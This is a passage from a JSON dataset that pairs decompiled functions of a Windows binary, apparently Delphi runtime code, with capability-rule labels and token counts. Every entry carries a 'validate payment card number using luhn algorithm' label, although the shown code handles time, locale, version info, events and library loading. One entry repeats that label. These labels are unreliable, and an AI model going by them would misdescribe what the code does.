        "decompiled_code": "\nuint32_t fcn.0040bc44(void)\n\n{\n    uchar auStack16 [16];\n    \n    sub.kernel32.dll_GetLocalTime();\n    return auStack16 & 0xffff;\n}\n",
        "token_count": 43
    },
    "0040bc58": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bc58(int32_t arg_8h)\n\n{\n    int32_t in_EDX;\n    int32_t iVar1;\n    \n    iVar1 = 0x100 - *(arg_8h + -0x104);\n    if (in_EDX < iVar1) {\n        iVar1 = in_EDX;\n    }\n    if (iVar1 != 0) {\n        fcn.004030ec();\n    }\n    *(arg_8h + -0x104) = *(arg_8h + -0x104) + iVar1;\n    return;\n}\n",
        "token_count": 129
    },
    "0040bcb8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040bcb8(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch._0_1_ = 0;\n    var_14h._0_1_ = 0;\n    arg_8h_00 = 1;\n    fcn.0040aa9c(1, &var_20h, 4);\n    fcn.0040bc58(arg_8h_00);\n    return;\n}\n",
        "token_count": 153
    },
    "0040c7f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040c7f4(uint param_1, int32_t param_2)\n\n{\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    \n    if (param_2 == 0) {\n        fcn.0040c03c(&stack0xfffffffc);\n    }\n    else {\n        fcn.0040c03c(&stack0xfffffffc);\n    }\n    fcn.0040555c();\n    return;\n}\n",
        "token_count": 109
    },
    "0040ca68": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040ca68(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    while( true ) {\n        uVar3 = fcn.0040572c();\n        if ((uVar3 < *param_2) || (cVar1 = *(in_EAX + -1 + *param_2),  uVar3 = cVar1 - 0x3a,  cVar1 - 0x30U < 10))\n        break;\n        uVar3 = *(in_EAX + -1 + *param_2);\n        if ((*((uVar3 >> 3) + 0x4a1830) >> (uVar3 & 7) & 1) == 0) {\n            *param_2 = *param_2 + 1;\n        }\n        else {\n            iVar2 = fcn.0040e6ac();\n            *param_2 = iVar2;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 247
    },
    "0040d114": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.0040d114(void)\n\n{\n    char cVar1;\n    double dStack20;\n    \n    cVar1 = fcn.0040d148();\n    if (cVar1 == '\\0') {\n        fcn.004096b4();\n    }\n    return dStack20;\n}\n",
        "token_count": 68
    },
    "0040d1e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040d1e4(void)\n\n{\n    int32_t iVar1;\n    uint uStack292;\n    uint uStack288;\n    uint uStack284;\n    uint uStack276;\n    uchar *puStack272;\n    uint uStack268;\n    uint uStack264;\n    uchar auStack260 [256];\n    \n    uStack264 = 0;\n    uStack268 = 0x100;\n    puStack272 = &stack0xfffffefc;\n    uStack276 = 0;\n    uStack284 = 0;\n    uStack288 = 0x3200;\n    uStack292 = 0x40d208;\n    for (iVar1 = sub.kernel32.dll_FormatMessageA();\n        (0 < iVar1 && (((&stack0xfffffedf)[iVar1] < 0x21 || ((&stack0xfffffedf)[iVar1] == 0x2e)))); iVar1 = iVar1 + -1)\n    {\n    }\n    uStack292 = 0x40d228;\n    fcn.0040555c();\n    return;\n}\n",
        "token_count": 237
    },
    "0040d230": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get geographical location"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d230(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint lpLCData;\n    \n    iVar1 = sub.kernel32.dll_GetLocaleInfoA_1();\n    if (iVar1 < 1) {\n        fcn.004054c0();\n    }\n    else {\n        fcn.0040555c();\n    }\n    return;\n}\n",
        "token_count": 86
    },
    "0040d2e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040d2e4(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    var_14h = 0;\n    var_18h = 0;\n    uStack48 = 0x40d3f7;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    var_4h = sub.kernel32.dll_GetThreadLocale_1();\n    iVar1 = 1;\n    do {\n        fcn.0040d2a8(&var_ch, 0xb, &stack0xfffffffc);\n        fcn.004054c0();\n        fcn.0040d2a8(&var_10h, 0xb, &stack0xfffffffc);\n        fcn.004054c0();\n        iVar1 = iVar1 + 1;\n    } while (iVar1 != 0xd);\n    iVar1 = 1;\n    do {\n        var_8h = (iVar1 + 5) % 7;\n        fcn.0040d2a8(&var_14h, 6, &stack0xfffffffc);\n        fcn.004054c0();\n        fcn.0040d2a8(&var_18h, 6, &stack0xfffffffc);\n        fcn.004054c0();\n        iVar1 = iVar1 + 1;\n    } while (iVar1 != 8);\n    *in_FS_OFFSET = uStack52;\n    fcn.00405490(0x40d3fe);\n    return;\n}\n",
        "token_count": 447
    },
    "0040d4bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040d4bc(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    code **in_FS_OFFSET;\n    code *in_stack_ffffffc4;\n    code *pcStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack20 = 0x40d553;\n    pcStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &pcStack24;\n    puVar3 = &var_4h;\n    sub.kernel32.dll_GetThreadLocale_1();\n    fcn.0040d230(puVar3);\n    iVar1 = fcn.00409e14();\n    if (iVar1 - 3U < 3) {\n        uVar2 = sub.kernel32.dll_GetThreadLocale_1(iVar1, 4);\n        sub.kernel32.dll_EnumCalendarInfoA(fcn.0040d408, uVar2);\n        iVar4 = 7;\n        puVar3 = 0x4a88f4;\n        do {\n            *puVar3 = 0xffffffff;\n            puVar3 = puVar3 + 1;\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n        uVar2 = sub.kernel32.dll_GetThreadLocale_1(iVar1, 3);\n        in_stack_ffffffc4 = fcn.0040d444;\n        sub.kernel32.dll_EnumCalendarInfoA(fcn.0040d444, uVar2);\n    }\n    *in_FS_OFFSET = in_stack_ffffffc4;\n    fcn.0040546c(0x40d55a);\n    return;\n}\n",
        "token_count": 402
    },
    "0040d7a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040d7a8(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t in_EDX;\n    uint var_458h;\n    uint *var_358h;\n    uint var_354h;\n    uint *var_350h;\n    uint var_34ch;\n    int32_t var_348h;\n    uint var_344h;\n    int32_t var_340h;\n    uint var_33ch;\n    uint var_338h;\n    uint var_334h;\n    uint var_330h;\n    int32_t var_32ch;\n    int32_t var_320h;\n    uint var_312h;\n    uint var_212h;\n    uint var_10dh;\n    int32_t var_8h;\n    uint var_4h;\n    \n    sub.kernel32.dll_VirtualQuery_1();\n    if (var_320h == 0x1000) {\n        iVar3 = var_32ch;\n        iVar2 = sub.kernel32.dll_GetModuleFileNameA_1(var_32ch, &var_212h, 0x105);\n        if (iVar2 != 0) {\n            var_8h = in_EDX - var_32ch;\n            goto code_r0x0040d81e;\n        }\n    }\n    iVar3 = *0x4a87f8;\n    sub.kernel32.dll_GetModuleFileNameA_1();\n    var_8h = fcn.0040d79c();\ncode_r0x0040d81e:\n    fcn.0040e934(iVar3);\n    fcn.0040a7f0();\n    var_340h = 0x40d928;\n    var_338h = 0x40d928;\n    cVar1 = fcn.004047cc();\n    if (cVar1 != '\\0') {\n        var_340h = fcn.004058fc();\n        iVar3 = fcn.0040a764();\n        if ((iVar3 != 0) && (*(var_340h + -1 + iVar3) != '.')) {\n            var_338h = 0x40d92c;\n        }\n    }\n    uVar4 = fcn.00406940(*(*0x4a5130 + 4), &var_312h, 0x100);\n    sub.user32.dll_LoadStringA_1(uVar4);\n    fcn.00404520();\n    var_358h = &var_458h;\n    var_354h._0_1_ = 4;\n    var_350h = &var_10dh;\n    var_34ch._0_1_ = 6;\n    var_348h = var_8h;\n    var_344h._0_1_ = 5;\n    var_33ch._0_1_ = 6;\n    var_334h._0_1_ = 6;\n    fcn.0040ae54(4, &var_358h);\n    fcn.0040a764();\n    return;\n}\n",
        "token_count": 698
    },
    "0040d9f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040d9f8(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.004054c0();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 131
    },
    "0040da34": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040da34(uint arg_8h, uint arg_ch)\n\n{\n    char in_DL;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_4h;\n    \n    var_4h = 0;\n    if (in_DL != '\\0') {\n        puStack40 = 0x40da48;\n        fcn.00404964();\n    }\n    uStack44 = 0x40da8e;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    arg_8h_00 = &fcn.0040da34::var_4h;\n    puStack40 = &stack0xfffffffc;\n    fcn.0040ae94(arg_8h_00);\n    fcn.004054c0();\n    *in_FS_OFFSET = arg_8h_00;\n    uStack44 = 0x40da95;\n    iStack48 = 0x40da8d;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 259
    },
    "0040dab4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040dab4(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00407480();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 129
    },
    "0040daf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040daf0(uint arg_8h, uint arg_ch)\n\n{\n    char in_DL;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    if (in_DL != '\\0') {\n        puStack44 = 0x40db06;\n        fcn.00404964();\n    }\n    uStack48 = 0x40db5c;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    arg_8h_00 = &fcn.0040daf0::var_4h;\n    puStack44 = &stack0xfffffffc;\n    fcn.00407480();\n    fcn.0040ae94(arg_8h_00);\n    fcn.004054c0();\n    *in_FS_OFFSET = arg_8h_00;\n    uStack48 = 0x40db63;\n    iStack52 = 0x40db5b;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 272
    },
    "0040db84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040db84(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404964();\n        in_DL = extraout_DL;\n    }\n    fcn.004054c0();\n    *(in_EAX + 8) = arg_8h;\n    if (in_DL != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 146
    },
    "0040dcc8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040dcc8(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint *arg_ch;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack56 = 0x40dd64;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack60;\n    if (in_EAX == 0) {\n        fcn.00407480();\n    }\n    else {\n        puStack52 = &stack0xfffffffc;\n        fcn.00405504();\n    }\n    var_1ch = var_4h;\n    var_18h._0_1_ = 0xb;\n    var_10h._0_1_ = 0xb;\n    var_8h._0_1_ = 0;\n    arg_ch = &var_1ch;\n    arg_8h = 2;\n    var_14h = param_2;\n    fcn.00407480();\n    fcn.0040da34(arg_8h, arg_ch);\n    *in_FS_OFFSET = arg_8h;\n    uStack60 = 0x40dd6b;\n    fcn.0040546c();\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 386
    },
    "0040dd84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040dd84(uint arg_8h)\n\n{\n    fcn.0040dcc8();\n    fcn.0040dd74();\n    return;\n}\n",
        "token_count": 40
    },
    "0040ddb8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040ddb8(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    unkbyte3 Var3;\n    int32_t iVar2;\n    \n    iVar1 = *in_EAX;\n    Var3 = iVar1 >> 8;\n    if (iVar1 < -0x3fffff6d) {\n        iVar2 = iVar1;\n        if (iVar1 == -0x3fffff6e) {\ncode_r0x0040de1c:\n            return CONCAT31(iVar2 >> 8, 6);\n        }\n        if (iVar1 < -0x3fffff71) {\n            if (iVar1 == -0x3fffff72) {\n                return CONCAT31(Var3, 7);\n            }\n            if (iVar1 == -0x3ffffffb) {\n                return 0xb;\n            }\n            if (iVar1 == -0x3fffff74) {\n                return 4;\n            }\n            iVar2 = iVar1 + 0x3fffff73;\n            if (iVar2 == 0) goto code_r0x0040de25;\n        }\n        else {\n            iVar2 = iVar1 + 0x3fffff6f;\n            if (iVar1 + 0x3fffff71U < 2) goto code_r0x0040de1c;\n            if (iVar2 == 0) {\n                return 8;\n            }\n        }\n    }\n    else if (iVar1 < -0x3fffff69) {\n        if (iVar1 == -0x3fffff6a) {\n            return CONCAT31(Var3, 0xc);\n        }\n        iVar2 = iVar1 + 0x3fffff6d;\n        if (iVar2 == 0) {\ncode_r0x0040de25:\n            return CONCAT31(iVar2 >> 8, 9);\n        }\n        if (iVar1 == -0x3fffff6c) {\n            return 3;\n        }\n        iVar2 = iVar1 + 0x3fffff6b;\n        if (iVar2 == 0) {\n            return 5;\n        }\n    }\n    else {\n        if (iVar1 == -0x3fffff03) {\n            return 0xe;\n        }\n        iVar2 = iVar1 + 0x3ffffec6;\n        if (iVar2 == 0) {\n            return 0xd;\n        }\n    }\n    return CONCAT31(iVar2 >> 8, 0x16);\n}\n",
        "token_count": 552
    },
    "0040e01c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040e01c(void)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd4;\n    uint *arg_ch;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x40e0d5;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    var_4h = in_EAX;\n    uVar2 = fcn.0040ddb8();\n    uVar2 = uVar2 & 0xff;\n    if (7 < uVar2 - 3) {\n        if (uVar2 == 0xb) {\n            in_stack_ffffffd4 = 0x40e073;\n            iVar3 = fcn.0040de50(&stack0xfffffffc);\n            goto code_r0x0040e0a8;\n        }\n        if (9 < uVar2 - 0xc) {\n            var_ch = *var_4h;\n            var_8h._0_1_ = 0;\n            arg_ch = &fcn.0040e01c::var_ch;\n            in_stack_ffffffd4 = 0;\n            fcn.00407480();\n            iVar3 = fcn.0040da34(in_stack_ffffffd4, arg_ch);\n            goto code_r0x0040e0a8;\n        }\n    }\n    iVar3 = fcn.0040d9f8();\ncode_r0x0040e0a8:\n    cVar1 = fcn.004047cc();\n    if (cVar1 != '\\0') {\n        *(iVar3 + 0xc) = var_4h;\n    }\n    *in_FS_OFFSET = in_stack_ffffffd4;\n    uStack36 = 0x40e0dc;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 490
    },
    "0040e2a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get file version info"
        ],
        "decompiled_code": "\nvoid fcn.0040e2a0(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffa0;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint puLen;\n    int32_t lplpBuffer;\n    uint pBlock;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack40 = 0x40e376;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    var_8h = 0xffffffff;\n    puStack48 = 0x40e2cd;\n    fcn.00405504();\n    puStack48 = 0x40e2d5;\n    fcn.00405954();\n    puStack48 = &fcn.0040e2a0::var_ch;\n    uStack52 = 0x40e2e1;\n    uStack52 = fcn.004058fc();\n    puStack56 = 0x40e2e7;\n    iVar1 = sub.version.dll_GetFileVersionInfoSizeA();\n    if (iVar1 != 0) {\n        puStack56 = 0x40e2f4;\n        pBlock = fcn.00402ef0();\n        uStack60 = 0x40e359;\n        uStack64 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc0;\n        puStack56 = &stack0xfffffffc;\n        uVar2 = fcn.004058fc(var_ch, iVar1, pBlock);\n        iVar1 = sub.version.dll_GetFileVersionInfoA(uVar2);\n        if (iVar1 != 0) {\n            in_stack_ffffffa0 = pBlock;\n            iVar1 = sub.version.dll_VerQueryValueA(pBlock, 0x40e388, &fcn.0040e2a0::lplpBuffer, &fcn.0040e2a0::puLen);\n            if (iVar1 != 0) {\n                var_8h = *(lplpBuffer + 8);\n            }\n        }\n        *in_FS_OFFSET = in_stack_ffffffa0;\n        fcn.00402f0c(0x40e360);\n        return;\n    }\n    *in_FS_OFFSET = uStack52;\n    uStack44 = 0x40e37d;\n    puStack48 = 0x40e375;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 611
    },
    "0040e9a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040e9a8(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint var_1h;\n    \n    sub.kernel32.dll_GetCPInfo(0, arg_8h + -0x14);\n    for (iVar4 = 0; (iVar4 < 0xc && ((*(arg_8h + -0xe + iVar4) | *(arg_8h + -0xd + iVar4)) != 0)); iVar4 = iVar4 + 2) {\n        var_1h._0_1_ = *(arg_8h + -0xe + iVar4);\n        uVar1 = *(arg_8h + -0xd + iVar4);\n        if (var_1h <= uVar1) {\n            cVar3 = (uVar1 - var_1h) + '\\x01';\n            do {\n                puVar2 = (var_1h >> 3) + 0x4a1830;\n                *puVar2 = *puVar2 | '\\x01' << (var_1h & 7);\n                var_1h._0_1_ = var_1h + 1;\n                cVar3 = cVar3 + -1;\n            } while (cVar3 != '\\0');\n        }\n    }\n    return;\n}\n",
        "token_count": 342
    },
    "0040f130": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040f130(void)\n\n{\n    sub.kernel32.dll_GetModuleFileNameA_1();\n    fcn.0040555c();\n    return;\n}\n",
        "token_count": 37
    },
    "0040f174": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040f174(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd0;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x40f1ff;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    if (in_EAX == 0) {\n        iVar1 = fcn.0040dab4();\n    }\n    else {\n        var_ch._0_1_ = 0;\n        puStack32 = &stack0xfffffffc;\n        fcn.0040d1e4();\n        var_8h = 0;\n        var_4h._0_1_ = 0xb;\n        in_stack_ffffffd0 = 1;\n        iVar1 = fcn.0040daf0(1, &var_10h);\n    }\n    *(iVar1 + 0xc) = in_EAX;\n    fcn.00404eb4();\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    uStack40 = 0x40f206;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 332
    },
    "0040f56c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040f56c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00404610();\n    *(in_EAX + 0xc) = 0xffff;\n    uVar1 = sub.kernel32.dll_CreateEventA(0, 0xffffffff, 0xffffffff, 0);\n    *(in_EAX + 0x10) = uVar1;\n    uVar2 = 0;\n    uVar1 = sub.kernel32.dll_CreateEventA(0, 0, 0, 0);\n    *(in_EAX + 0x14) = uVar1;\n    *(in_EAX + 0x18) = 0xffffffff;\n    uVar1 = fcn.00404610();\n    *(in_EAX + 0x20) = uVar1;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uVar2;\n    }\n    return in_EAX;\n}\n",
        "token_count": 288
    },
    "0040f90c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040f90c(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint uStack24;\n    uint var_ch;\n    uint var_8h;\n    \n    puStack40 = &stack0xfffffffc;\n    puStack28 = 0x40f91b;\n    uStack24 = param_2;\n    sub.kernel32.dll_SetErrorMode();\n    uStack32 = 0x40f97e;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack44 = 0x40f960;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack28 = &stack0xfffffffc;\n    uVar1 = fcn.004058fc();\n    sub.kernel32.dll_LoadLibraryA();\n    *in_FS_OFFSET = uVar1;\n    return;\n}\n",
        "token_count": 251
    },
    "00410be8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "PEB access"
        ],
        "decompiled_code": "\nvoid fcn.00410be8(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    uint var_4h;\n    \n    puStack12 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack16 = 0x410c32;\n    uStack20 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffec;\n    fcn.00407480();\n    fcn.0040d9f8();\n    fcn.00404eb4();\n    *in_FS_OFFSET = uStack20;\n    puStack12 = 0x410c39;\n    uStack16 = 0x410c31;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 175
    },
    "00410c3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00410c3c(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint *arg_ch;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    uStack48 = 0x410ccb;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    fcn.00415b00();\n    var_10h = 0;\n    var_ch._0_1_ = 0xb;\n    fcn.00415b00();\n    var_8h = 0;\n    var_4h._0_1_ = 0xb;\n    arg_ch = &var_10h;\n    arg_8h = 1;\n    fcn.00407480();\n    fcn.0040da34(arg_8h, arg_ch);\n    fcn.00404eb4();\n    *in_FS_OFFSET = arg_8h;\n    uStack52 = 0x410cd2;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 304
    },
    "00410d2c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00410d2c(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint *arg_ch;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    uStack48 = 0x410dbb;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    fcn.00415b00();\n    var_10h = 0;\n    var_ch._0_1_ = 0xb;\n    fcn.00415b00();\n    var_8h = 0;\n    var_4h._0_1_ = 0xb;\n    arg_ch = &var_10h;\n    arg_8h = 1;\n    fcn.00407480();\n    fcn.0040da34(arg_8h, arg_ch);\n    fcn.00404eb4();\n    *in_FS_OFFSET = arg_8h;\n    uStack52 = 0x410dc2;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 305
    },
    "0041119c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
